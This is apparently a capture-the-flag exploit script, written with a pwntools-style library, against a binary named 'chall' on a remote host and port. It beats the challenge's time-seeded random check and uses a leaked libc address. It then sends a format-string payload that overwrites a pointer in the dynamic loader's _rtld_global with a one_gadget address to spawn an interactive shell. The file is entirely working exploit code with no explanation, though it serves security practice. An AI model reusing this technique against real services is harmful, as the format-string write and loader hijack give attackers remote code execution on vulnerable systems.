#!/usr/bin/python3
# -*- coding: utf-8 -*-
# Author := 4n0nym4u5

from rootkit.basic import *
from time import sleep
import ctypes

exe = context.binary = ELF("./chall")
host = args.HOST or "35.222.8.29"
port = int(args.PORT or 1337)

gdbscript = """
brva 0x1397
""".format(
    **locals()
)

while True:
    try:
        LIBC = ctypes.cdll.LoadLibrary("libc.so.6")
        ld = ELF("./ld-2.31.so")
        libc = SetupLibcELF()
        io = start()
        LIBC.srand(LIBC.time(0))
        ans = LIBC.rand() % 10
        sl(ans)
        libc.address = GetInt(rl())[0] - libc.sym.system
        ld.address = libc.address + 0x1F6000
        lb()
        target = ld.sym["_rtld_global"] + 3848
        payload = b"" + fmtstr_payload(
            6,
            {target: libc.address + 0xE3AFE},
            write_size="short",
        )

        print(hex(len(payload)))
        print(hex(target))
        rl()
        sl(payload)
        io.clean()
        io.interactive()
    except:
        pass
